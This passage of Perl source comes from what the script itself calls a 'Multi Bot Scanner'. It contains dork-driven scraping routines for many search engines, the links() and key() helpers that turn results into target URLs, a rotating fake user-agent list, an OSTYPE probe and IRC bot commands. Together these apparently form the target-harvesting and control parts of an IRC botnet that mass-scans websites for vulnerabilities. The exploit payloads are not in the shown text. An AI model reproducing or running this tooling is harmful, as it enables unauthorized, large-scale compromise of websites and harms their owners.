my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://br.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://be.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://us.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://it.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
sub yahoo() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=500; $b+=1) {
my $yahoo = ("http://de.search.yahoo.com/search?p=".key($key)."&ei=UTF-8&fr=yfp-t-501&fp_ip=IT&pstart=1&b=".$b);
my $Res = query($yahoo);
while ($Res =~ m/26u=(.*?)%26w=/g) {
if ($1 !~ /yahoo/){
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}
############
sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub virgillio() {
my @lst;
my $key = $_[0];
for($b=0;$b<=300;$b+=100){
my $Lyc=("http://ricerca.virgilio.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g){
if ($1 !~ /Virgillio/) {
my $k = $1;
my @grep = links($k);
push(@lst, @grep);
}
}
}
return @lst;
}

sub ask() {
my @lst;
my $key = $_[0];
my $b   = 0;
my $pg  = 0;
for ($b=0; $b<=1000; $b+=10) {
my $Ask = ("http://it.ask.com/web?q=".key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$b);
my $Res = query($Ask);
while ($Res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
if ($1 !~ /ask.com/){
my $k = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}

sub uol() {
my @lst;
my $key = $_[0];
my $b   = 0;
for ($b=1; $b<=1000; $b+=10) {
my $UoL = ("http://mundo.busca.uol.com.br/buscar.html?q=".key($key)."&start=".$b);
my $Res = query($UoL);
while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g ) {
my $k = $1;
if ( $k !~ /busca|uol|yahoo/ ) {
my $k    = $1;
my @grep = links($k);
push( @lst, @grep );
}
}
}
return @lst;
}

sub lycos(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ly=("http://search.lycos.com/?query=".key($key)."&page=$av".$b);
my $Res=query($ly);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub snz(){
my @lst;
my $key = $_[0];
for($b=1;$b<=15;$b+=1){#20
my $Lyc=("http://searchnz.co.nz/search.aspx?q=".key($key)."&np=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub seznam(){
my @lst;
my $key = $_[0];
for($b=1;$b<=300;$b+=10){#20
my $Lyc=("http://search.seznam.cz/?q=".key($key)."&from=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a href=\"http:\/\/(.+?)\/\" title=/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub szukacz(){
my @lst;
my $key = $_[0];
for($b=0;$b<=600;$b+=20){#20
my $Lyc=("http://www.szukacz.pl/szukaj.aspx?ct=polska&pc=polska&enc=iso-8859-2&q=".key($key)."&start=".$b);
my $Res=query($Lyc);
while($Res =~ m/<a title=\"?http:\/\/(.+?)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}
}
return @lst;
}

sub kvasir(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100){
my $nor=("http://www.kvasir.no/nettsok/searchResult.html?offset=".$i."&searchExpr=".key($key)."&searchRegion=country&x=66&y=21");
my $Res=query($nor);
while($Res =~ m/<span class=\"?url\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ixquic(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100){
my $ix=("http://s7-eu.ixquick.com/do/metasearch.pl?cmd=process_search&startat=".$i."&la nguage=italiano&qid=LHHHMSMONPLO&query=".key($key) ."&cat=web&rl=NONE&lui=italiano&ff=&rcount=");
my $Res=query($ix);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100){
my $ali=("http://ricerca.alice.it/ricerca?qs=".key($key)."&filter=1&site=&lr=&hits=1 0&offset=".$i);
my $Res=query($ali);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub tiscali(){
my @lst;
my $key = $_[0];
for($b=1;$b<=500;$b++){
my $tisc=("http://search.tiscali.it/?tiscalitype=web&collection=web&start=".$b."&q=".key($key));
my $Res=query($tisc);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub gigablast() {
    my @lst;
    my $key = $_[0];
    for ($i = 0; $i <= 1000; $i += 10) {
        my $giga = ("http://www.gigablast.com/search?s=".$i."&q=".key($key));
        my $Res = query($giga);
        while ($Res =~ m/href=http:\/\/(.+?)><font/g) {
            if ($1 !~ /answers|gigablast|google|yahoo|msn|teoma|dmoz/){
				my $k = $1;
                my @grep = links($k);
                push(@lst, @grep);
            }
        }
    }
    return @lst;
}

sub sapo(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=200; $i++){
my $por=("http://pesquisa.sapo.pt/?barra=resumo&format=html&limit=10&location=pt&pag e=".$i."&q=".key($key)."&st=local");
my $Res=query($por);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub naver() {
my @lst;
my $key = $_[0];
for ( $b=1;$b<=1000;$b+=10){
my $naver = ( "http://web.search.naver.com/search.naver?where=webkr&query=".key($key)."&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=".$b);
my $Res = query($naver);
while ( $Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k = $1;
if ($k!~/busca|uol|yahoo/) {
my $k = $1;
my @grep = links($k);
push( @lst, @grep);
}
}
}
return @lst;
}

sub rediff() {
my @lst;
my $key = $_[0];
for ($i = 0;$i <= 990;$i += 10) {
my $mlink = ( "http://search1.rediff.com/dirsrch/default.asp?MT=".key($key)."&iss=&submit=Search&firstres=".$i);
my $re = query($mlink);
while ($re =~ m/onmousedown=\"return enc\(this\, \'http:\/\/(.*?)\//g) {
my $h = $1;
my @grep=links($h);
push(@lst,@grep);          
}
}
return @lst;
}

sub walla() {
my @lst;
my $key = $_[0];
for ($i = 0;$i <= 80;$i += 1) {
my $mlink = ( "http://search.walla.co.il/?t=0&e=utf&q=".key($key)."&p=".$i);
my $re = query($mlink);
while ($re =~ m/<td class=sw><a href=\"http:\/\/(.*?)\//g) {
my $h = $1;
my @grep=links($h);
push(@lst,@grep);     
}
}
return @lst;
}

sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $aol=("http://search.aol.co.uk/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($aol);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

##############################################################
##			  end engine 			    ##
##############################################################
##############################################################
sub os() {
    my $target=$_[0];
    my $re  = &query($target);
    while ($re =~ m/<br>OSTYPE:(.+?)\<br>/g) {
        $os = $1;
    }
}
#sub query($) {
#my $url = $_[0];
#$url =~ s/http:\/\///;
#my $host  = $url;
#my $query = $url;
#my $page  = "";
#$host  =~ s/href=\"?http:\/\///;
#$host  =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
#$query =~ s/$host//;
#if ( $query eq "" ) { $query = "/"; }
#eval {
#my $sock = IO::Socket::INET->new(PeerAddr => "$host", PeerPort => "80", Proto => "tcp") or return;
#print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1\r\n\r\n";
#my @r = <$sock>;
#$page = "@r";
#close($sock);
#};
#return $page;
#}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    $ua->agent($User_Agent[rand(scalar(@User_Agent))]);
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub Agent(){
	my @ret = (
	"Microsoft Internet Explorer/4.0b1 (Windows 95)",
	"Mozilla/1.22 (compatible; MSIE 1.5; Windows NT)",
	"Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)",
	"Mozilla/2.0 (compatible; MSIE 3.01; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 5.0; SunOS 5.9 sun4u; X11)",
	"Mozilla/4.0 (compatible; MSIE 5.17; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.23; Mac_PowerPC)",
	"Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)",
	"Mozilla/4.0 (compatible; MSIE 6.0; MSN 2.5; Windows 98)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Win32)",
	"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
	"Microsoft Pocket Internet Explorer/0.6",
	"Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; 240x320)",
	"MOT-MPx220/1.400 Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Smartphone;",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.1; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.2; Windows NT 5.1;)",
	"Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)",
	"Advanced Browser (http://www.avantbrowser.com)",
	"Avant Browser (http://www.avantbrowser.com)",
	"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)",
	"Mozilla/5.0 (compatible; Konqueror/3.1-rc3; i686 Linux; 20020515)",
	"Mozilla/5.0 (compatible; Konqueror/3.1; Linux 2.4.22-10mdk; X11; i686; fr, fr_FR)",
	"Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.8) Gecko/20050511",
	"Mozilla/5.0 (X11; U; Linux i686; cs-CZ; rv:1.7.12) Gecko/20050929",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl-NL; rv:1.7.5) Gecko/20041202 Firefox/1.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox",
	"Mozilla/5.0 (X11; U; FreeBSD i386; en-US; rv:1.7.8) Gecko/20050609 Firefox/1.0.4",
	"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10) Gecko/20050716 Firefox/1.0.6",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-GB; rv:1.7.10) Gecko/20050717 Firefox/1.0.6",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8b4) Gecko/20050908 Firefox/1.4",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8) Gecko/20051107 Firefox/1.5",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1",
	"Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.9a1) Gecko/20051002 Firefox/1.6a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20060321 Firefox/2.0a1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b1) Gecko/20060710 Firefox/2.0b1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1b2) Gecko/20060710 Firefox/2.0b2",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1) Gecko/20060918 Firefox/2.0",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8) Gecko/20051219 SeaMonkey/1.0b",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.0.1) Gecko/20060130 SeaMonkey/1.0",
	"Mozilla/3.0 (OS/2; U)",
	"Mozilla/3.0 (X11; I; SunOS 5.4 sun4m)",
	"Mozilla/4.61 (Macintosh; I; PPC)",
	"Mozilla/4.61 [en] (OS/2; U)",
	"Mozilla/4.7C-CCK-MCD {C-UDP; EBM-APPLE} (Macintosh; I; PPC)",
	"Mozilla/4.8 [en] (Windows NT 5.0; U)" );
return(@ret);
}

sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}
sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
    return $dork;
}

sub calculate {
    my @calculate = ();
    my %visti = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visti{$element}++;
        push @calculate, $element;
    }
    return @calculate;
}

sub nick {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}

sub quit {
sendraw("QUIT $_[0]");
exit;
}
#####################################################################
#####################################################################
####          .: Multi Bot Scanner Powered by stealth  :.        ####
#####################################################################
#####################################################################